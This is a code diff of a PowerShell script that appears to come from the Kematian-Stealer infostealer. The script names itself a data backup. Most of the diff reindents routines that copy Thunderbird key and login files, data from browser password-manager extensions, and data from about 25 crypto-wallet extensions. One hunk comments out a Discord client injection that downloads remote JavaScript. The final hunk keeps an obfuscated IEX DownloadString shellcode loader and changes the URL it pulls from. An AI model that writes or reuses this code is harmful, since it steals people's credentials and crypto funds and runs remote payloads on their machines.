@@ -627,28 +627,28 @@ function Backup-Data {
     
     # Thunderbird 
     function thunderbirdbackup {
-    $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
-    if (!(Test-Path $thunderbirdfolder)) { return }
-    $thunderbirdbackup = "$folder_email\Thunderbird"
-    New-Item -ItemType Directory -Force -Path $thunderbirdbackup | Out-Null
-    $pattern = "^[a-z0-9]+\.default-esr$"
-    $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
-    $filter = @("key4.db","key3.db","logins.json","cert9.db","*.js")
-    foreach ($directory in $directories) {
-        $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
-        New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
-        foreach ($filePattern in $filter) {
-            Get-ChildItem -Path $directory.FullName -Recurse -Filter $filePattern -File | ForEach-Object {
-                $relativePath = $_.FullName.Substring($directory.FullName.Length).TrimStart('\')
-                $destFilePath = Join-Path -Path $destinationPath -ChildPath $relativePath
-                $destFileDir = Split-Path -Path $destFilePath -Parent
-                if (!(Test-Path -Path $destFileDir)) {
-                    New-Item -ItemType Directory -Force -Path $destFileDir | Out-Null
+        $thunderbirdfolder = "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles"
+        if (!(Test-Path $thunderbirdfolder)) { return }
+        $thunderbirdbackup = "$folder_email\Thunderbird"
+        New-Item -ItemType Directory -Force -Path $thunderbirdbackup | Out-Null
+        $pattern = "^[a-z0-9]+\.default-esr$"
+        $directories = Get-ChildItem -Path $thunderbirdfolder -Directory | Where-Object { $_.Name -match $pattern }
+        $filter = @("key4.db", "key3.db", "logins.json", "cert9.db", "*.js")
+        foreach ($directory in $directories) {
+            $destinationPath = Join-Path -Path $thunderbirdbackup -ChildPath $directory.Name
+            New-Item -ItemType Directory -Force -Path $destinationPath | Out-Null
+            foreach ($filePattern in $filter) {
+                Get-ChildItem -Path $directory.FullName -Recurse -Filter $filePattern -File | ForEach-Object {
+                    $relativePath = $_.FullName.Substring($directory.FullName.Length).TrimStart('\')
+                    $destFilePath = Join-Path -Path $destinationPath -ChildPath $relativePath
+                    $destFileDir = Split-Path -Path $destFilePath -Parent
+                    if (!(Test-Path -Path $destFileDir)) {
+                        New-Item -ItemType Directory -Force -Path $destFileDir | Out-Null
+                    }
+                    Copy-Item -Path $_.FullName -Destination $destFilePath -Force
                 }
-                Copy-Item -Path $_.FullName -Destination $destFilePath -Force
             }
         }
-      }
     }
     thunderbirdbackup
 	
@@ -785,60 +785,60 @@ function Backup-Data {
 
     # Password Managers
     function password_managers {
-    $browserPaths = @{
-        "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
-        "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
-        "Chromium"     = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
-        "Edge"         = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
-        "EpicPrivacy"  = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
-        "Iridium"      = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
-        "Opera"        = Join-Path $env:APPDATA "Opera Software\Opera Stable"
-        "OperaGX"      = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
-        "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
-        "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
-    }
-    $password_mgr_dirs = @{
-        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
-        "aeblfdkhhhdcdjpifhhbdiojplfjncoa" = "1Password"                  
-        "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass" 
-        "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane" 
-        "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden" 
-        "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm" 
-        "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper" 
-        "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword" 
-        "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC" 
-        "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass" 
-    }
-    foreach ($browser in $browserPaths.GetEnumerator()) {
-        $browserName = $browser.Key
-        $browserPath = $browser.Value
-        if (Test-Path $browserPath) {
-            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
-                $localExtensionsSettingsDir = $_.FullName
-                foreach ($password_mgr_dir in $password_mgr_dirs.GetEnumerator()) {
-                    $passwordmgrkey = $password_mgr_dir.Key
-                    $password_manager = $password_mgr_dir.Value
-                    $extentionPath = Join-Path $localExtensionsSettingsDir $passwordmgrkey
-                    if (Test-Path $extentionPath) {
-                        if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
-                            try {
-                                $password_mgr_browser = "$password_manager ($browserName)"
-                                $password_dir_path = Join-Path $password_managers $password_mgr_browser
-                                New-Item -ItemType Directory -Path $password_dir_path -Force | out-null
-                                Copy-Item -Path $extentionPath -Destination $password_dir_path -Recurse -Force
-                                $locationFile = Join-Path $password_dir_path "Location.txt"
-                                $extentionPath | Out-File -FilePath $locationFile -Force
-                                Write-Host "[!] Copied $password_manager from $extentionPath to $password_dir_path" -ForegroundColor Green
-                            }
-                            catch {
-                                Write-Host "[!] Failed to copy $password_manager from $extentionPath" -ForegroundColor Red
+        $browserPaths = @{
+            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
+            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
+            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
+            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
+            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
+            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
+            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
+            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
+            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
+        }
+        $password_mgr_dirs = @{
+            "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
+            "aeblfdkhhhdcdjpifhhbdiojplfjncoa" = "1Password"                  
+            "eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass" 
+            "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane" 
+            "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden" 
+            "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm" 
+            "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper" 
+            "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword" 
+            "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC" 
+            "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass" 
+        }
+        foreach ($browser in $browserPaths.GetEnumerator()) {
+            $browserName = $browser.Key
+            $browserPath = $browser.Value
+            if (Test-Path $browserPath) {
+                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
+                    $localExtensionsSettingsDir = $_.FullName
+                    foreach ($password_mgr_dir in $password_mgr_dirs.GetEnumerator()) {
+                        $passwordmgrkey = $password_mgr_dir.Key
+                        $password_manager = $password_mgr_dir.Value
+                        $extentionPath = Join-Path $localExtensionsSettingsDir $passwordmgrkey
+                        if (Test-Path $extentionPath) {
+                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
+                                try {
+                                    $password_mgr_browser = "$password_manager ($browserName)"
+                                    $password_dir_path = Join-Path $password_managers $password_mgr_browser
+                                    New-Item -ItemType Directory -Path $password_dir_path -Force | out-null
+                                    Copy-Item -Path $extentionPath -Destination $password_dir_path -Recurse -Force
+                                    $locationFile = Join-Path $password_dir_path "Location.txt"
+                                    $extentionPath | Out-File -FilePath $locationFile -Force
+                                    Write-Host "[!] Copied $password_manager from $extentionPath to $password_dir_path" -ForegroundColor Green
+                                }
+                                catch {
+                                    Write-Host "[!] Failed to copy $password_manager from $extentionPath" -ForegroundColor Red
+                                }
                             }
                         }
                     }
                 }
             }
         }
-      }
     }
     password_managers
 
@@ -863,7 +863,7 @@ function Backup-Data {
         }
         $zephyr_path = "$env:appdata\Zephyr\wallets"
         New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
-        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force}	
+        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force }	
         foreach ($wallet in $wallet_paths.Keys) {
             foreach ($pathName in $wallet_paths[$wallet].Keys) {
                 $sourcePath = $wallet_paths[$wallet][$pathName]
@@ -878,75 +878,75 @@ function Backup-Data {
     Local_Crypto_Wallets
 	
     function browserwallets {
-    $browserPaths = @{
-        "Brave"        = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
-        "Chrome"       = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
-        "Chromium"     = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
-        "Edge"         = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
-        "EpicPrivacy"  = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
-        "Iridium"      = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
-        "Opera"        = Join-Path $env:APPDATA "Opera Software\Opera Stable"
-        "OperaGX"      = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
-        "Vivaldi"      = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
-        "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
-    }
-    $walletDirs = @{
-        "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
-        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
-        "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
-        "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
-        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
-        "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
-        "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
-        "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
-        "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
-        "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
-        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
-        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
-        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
-        "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
-        "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
-        "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
-        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
-        "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
-        "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
-        "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
-        "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
-        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
-        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
-        "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
-        "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"       
-    }
-    foreach ($browser in $browserPaths.GetEnumerator()) {
-        $browserName = $browser.Key
-        $browserPath = $browser.Value
-        if (Test-Path $browserPath) {
-            Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
-                $localExtensionsSettingsDir = $_.FullName
-                foreach ($walletDir in $walletDirs.GetEnumerator()) {
-                    $walletKey = $walletDir.Key
-                    $walletName = $walletDir.Value
-                    $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
-                    if (Test-Path $extentionPath) {
-                        if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
-                            try {
-                                $wallet_browser = "$walletName ($browserName)"
-                                $walletDirPath = Join-Path $folder_crypto $wallet_browser
-                                New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
-                                Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
-                                $locationFile = Join-Path $walletDirPath "Location.txt"
-                                $extentionPath | Out-File -FilePath $locationFile -Force
-                                Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
-                            }
-                            catch {
-                                Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
+        $browserPaths = @{
+            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
+            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
+            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
+            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
+            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
+            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
+            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
+            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
+            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
+            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
+        }
+        $walletDirs = @{
+            "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
+            "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
+            "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
+            "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
+            "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
+            "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
+            "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
+            "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
+            "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
+            "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
+            "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
+            "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
+            "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
+            "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
+            "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
+            "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
+            "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
+            "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
+            "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
+            "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
+            "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
+            "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
+            "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
+            "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
+            "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"       
+        }
+        foreach ($browser in $browserPaths.GetEnumerator()) {
+            $browserName = $browser.Key
+            $browserPath = $browser.Value
+            if (Test-Path $browserPath) {
+                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
+                    $localExtensionsSettingsDir = $_.FullName
+                    foreach ($walletDir in $walletDirs.GetEnumerator()) {
+                        $walletKey = $walletDir.Key
+                        $walletName = $walletDir.Value
+                        $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
+                        if (Test-Path $extentionPath) {
+                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
+                                try {
+                                    $wallet_browser = "$walletName ($browserName)"
+                                    $walletDirPath = Join-Path $folder_crypto $wallet_browser
+                                    New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
+                                    Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
+                                    $locationFile = Join-Path $walletDirPath "Location.txt"
+                                    $extentionPath | Out-File -FilePath $locationFile -Force
+                                    Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
+                                }
+                                catch {
+                                    Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
+                                }
                             }
                         }
                     }
                 }
             }
         }
-    }
     }
     browserwallets
  
@@ -1010,35 +1010,35 @@ function Backup-Data {
     }
 
 
-    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
-    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
+    #$locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
+    #$discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
 
-    foreach ($path in $discPaths) {
-        $skibidipath = Join-Path $locAppData $path
-        if (-not (Test-Path $skibidipath)) {
-            continue
-        }
-        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
-            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
-                $files = Get-ChildItem $_.FullName
-                foreach ($file in $files) {
-                    if ($file.Name -eq "index.js") {
-                        $webClient = New-Object System.Net.WebClient
-                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
-                        if ($content -ne "") {
-                            $replacedContent = $content -replace "%WEBHOOK%", $webhook
-                            $replacedContent | Set-Content -Path $file.FullName -Force
-                        }
-                    }
-                }
-            }
-        }
-    }
+    #foreach ($path in $discPaths) {
+    #    $skibidipath = Join-Path $locAppData $path
+    #    if (-not (Test-Path $skibidipath)) {
+    #        continue
+    #    }
+    #    Get-ChildItem $skibidipath -Recurse | ForEach-Object {
+    #        if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
+    #            $files = Get-ChildItem $_.FullName
+    #            foreach ($file in $files) {
+    #                if ($file.Name -eq "index.js") {
+    #                    $webClient = New-Object System.Net.WebClient
+    #                    $content = $webClient.DownloadString("https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/injection.js")
+    #                    if ($content -ne "") {
+    #                        $replacedContent = $content -replace "%WEBHOOK%", $webhook
+    #                        $replacedContent | Set-Content -Path $file.FullName -Force
+    #                    }
+    #                }
+    #            }
+    #        }
+    #    }
+    #}
     
     #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
     
     Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
-    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $kematian_shellcode = ("https://github.com/Somali-Devs/Kematian-Stealer-V3/raw/main/frontend-src/kematian_shellcode.ps1")
     $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
     $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
